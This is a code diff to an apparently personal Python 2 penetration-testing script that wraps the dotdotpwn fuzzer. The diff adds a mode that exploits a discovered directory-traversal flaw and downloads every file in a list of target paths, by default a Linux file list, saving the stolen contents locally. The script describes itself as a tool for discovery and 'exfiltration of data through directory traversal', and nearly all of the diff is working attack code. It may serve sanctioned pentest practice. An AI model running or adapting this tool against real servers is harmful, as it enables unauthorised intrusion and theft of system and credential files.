@@ -1,9 +1,7 @@
 #!/usr/bin/python
 
 #ONLY WEB HAS BEEN IMPLEMENTED
-#TODO
-#Extend web: Data extraction from files
-#Extend script: Multiple protocols (FTP/TFTP)
+#If /usr/share/dotdotpwn/Reports exists, dotdotpwn will automatically put raw results in there for you
 
 import sys
 import os
@@ -12,6 +10,7 @@ from subprocess import CalledProcessError
 import argparse
 import multiprocessing
 from multiprocessing import Process, Queue
+import requests
     
 #This function currently runs regular and an extension web scans using ddpwn on a list of URLs
 #If something is found, it will output the result to the /dirb/ directory
@@ -83,12 +82,63 @@ def dotPwn(URL):
         if (writeOutputFile):    
             try:
                 outfile = "/root/scripts/recon_enum/results/exam/dirb/E%s" % resultsOut
-                print "INFO: Traversals found! See %s" % outfile
+                print "INFO: Traversals found using extensions! See %s" % outfile
                 outFileWriter = open(outfile, "w")
                 outFileWriter.write(fx.output)
                 outFileWriter.close()
             except:
                 raise
+    if (args.scan_and_retrieve):
+        if (len(vuln) > 0):
+            retrieve()
+    
+#grab pieces to build URL, feed in files to grab,     
+def retrieve():
+    vulnURLs = analyzeVuln(vuln)
+    tmp = vulnURLs[0]
+    vulnProto = tmp[0]
+    vulnBase = tmp[1]
+    vulnPage = tmp[2]
+    vulnStringPrefix = tmp[3]
+    vulnStringSuffix = tmp[4]
+    encodedSplit = tmp[5]
+    try:
+        xfilFileName = "%s" % args.xfil_files
+        xfilFile = open(xfilFileName,'r')
+        for xfil in xfilFile:
+            if (xfil[0] == "/"):
+                xfil = xfil[1:]
+            if ("\n" in xfil):
+                xfil = xfil[:-1]
+            xfiltmp = xfil.replace("/", "_") #for outputFile
+            vulnBasetmp = vulnBase.replace("/", "_") #for outputFile
+            xfil = xfil.replace("/", encodedSplit)
+            fullURL = vulnProto + vulnBase + vulnPage + vulnStringPrefix + xfil + vulnStringSuffix
+            fileContents, status_code = grabFileFromURL(fullURL)
+            if (status_code == 200):
+                outputFile = "/root/scripts/recon_enum/results/exam/dotdotpwn/%s_%s" % (vulnBasetmp, xfiltmp)
+                try:
+                    output = open(outputFile, 'w+')
+                    output.write(fileContents)
+                    output.close()
+                except UnicodeEncodeError:
+                    output = open(outputFile, 'w+')
+                    fileContents = fileContents.encode('ascii','xmlcharrefreplace')
+                    output.write(fileContents)
+                    output.close()
+                except:
+                    raise
+    except:
+        raise
+    print "INFO: Downloading of files complete"
+
+def grabFileFromURL(url):
+    try:
+        r = requests.get(url)
+        if (r.status_code == 200):
+            return r.text, r.status_code
+    except:
+        raise
 
 ##1, grab port
 ##2, output file cannot have "/" in filename
@@ -129,18 +179,22 @@ def analyzeVuln(vulnar):
 #will return values to build a string like base+page+pre+path+encodedsplit+userrequestfile+suffix
 #let base = IP:Port/
 #let vulnPage = page.ext[/|=]
-    vulnURL = []
-    vulnBase = ""
-    vulnPage = ""
-    vulnStringPrefix = ""
-    vulnStringSuffix = ""
-    encodedSplit = ""
+    final = []
     for vuln in vulnar:
+        vulnProto = ""
+        vulnURL = []
+        vulnBase = ""
+        vulnPage = ""
+        vulnStringPrefix = ""
+        vulnStringSuffix = ""
+        encodedSplit = ""
         tmp = vuln[17:len(vuln)-14]
         vulnURL.append(tmp)
-        if ("http://" in tmp):       
+        if ("http://" in tmp):
+            vulnProto = "http://"
             vulnBase = tmp.split("http://")[1]
         if ("https://" in tmp):
+            vulnProto = "https://"
             vulnBase = tmp.split("https://")[1]
         vulnPagetmp = vulnBase.split("/",1)[1]
         vulnBase = vulnBase.split("/",1)[0]       
@@ -165,7 +219,7 @@ def analyzeVuln(vulnar):
                         encodedSplit = encodedSplit + c
             if ("issue" in vulnStringPrefixtmp):
                 vulnStringSuffix = vulnStringPrefixtmp.split("issue")[1]
-                for c in encodedSplittmp:
+                for c in encodedSplittmp: 
                     if (c == "p"):
                         break
                     else:
@@ -173,33 +227,42 @@ def analyzeVuln(vulnar):
         if (args.os == 'windows'):
             print "Error: Windows not supported for file exfil yet"
             raise
-    return vulnBase, vulnPage, vulnStringPrefix, vulnStringSuffix, encodedSplit
+        vals = vulnProto, vulnBase, vulnPage, vulnStringPrefix, vulnStringSuffix, encodedSplit
+        final.append(vals)
+    return final
     
 if __name__=='__main__':
 
     parser = argparse.ArgumentParser(description='Rough script to handle discovery of and exfiltration of data through directory traversal')
     parser.add_argument('-d', '--scan-depth', type=int, action="store", dest="depth", default=10, help="depth of ../../../ to extend to, default of 10")
     parser.add_argument('-e', '--extensions', type=str, action="store", dest="extensions", default='".html"', help='extensions appended at the end of each fuzz string (e.g. \'".php", ".jpg", ".inc"\'  Entire list needs to be encased in single quotes. Each extension needs to be in double quotes. There needs to be a comma and a space between each extension)')
-    parser.add_argument('file', type=str, help="file with URLs to iterate through")
-    parser.add_argument('os', action="store", help="OS greatly helps reduce false positives and reduces scan time. 'windows' or 'unix'")
-    parser.add_argument('-s', '--scan-only', action="store_true", dest="scan_only", default="true", help="only scan the target for directory traversal")
+    parser.add_argument('file', type=str, help="file with URLs to fuzz")
+    parser.add_argument('os', type=str, action="store", help="OS greatly helps reduce false positives and reduces scan time. 'windows' or 'unix'")
+    parser.add_argument('-s', '--scan', action="store_true", dest="scan", default="true", help="scan the target for directory traversal")
+    parser.add_argument('-sr', '--scan-and-retrieve', nargs='?', const='true', default='false', dest="scan_and_retrieve", help="scan and retrieve files if a directory traversal is found")
+    parser.add_argument('-x', '--xfil-files', type=str, action="store", dest="xfil_files", default="/root/lists/Personal/Misc Lists/DirTrav/linux_all.txt", help="list of files to retrieve if a directory traversal vulnerability is found. Default is linux_all.txt.")
     
     args = parser.parse_args()
-    print args
+    #print args
     vuln = []
     inputFileName = "%s" % args.file
-    if (args.scan_only):
+    if (args.os == "windows"):
+        if ("linux_all.txt" in args.xfil_files):
+            print "Error: Will not retrieve linux files from Windows. Set os to linux or pass a file with windows files to -x"
+            raise       
+    
+    if (args.scan):
         try:
-            inputFile = open(inputFileName)
+            inputFile = open(inputFileName,'r')
             jobs = []
             for URL in inputFile:
+                if ("\n" in URL):
+                    URL = URL[:-1]
                 if (URL[0] != "#"):
-                    print "Processing %s" % URL
+                    #print "Processing %s" % URL
                     p = multiprocessing.Process(target=dotPwn, args=(URL,))
                     jobs.append(p)
                     p.start()
             inputFile.close()
         except:
             raise
-    print vuln
-    analyzeVuln(vuln)
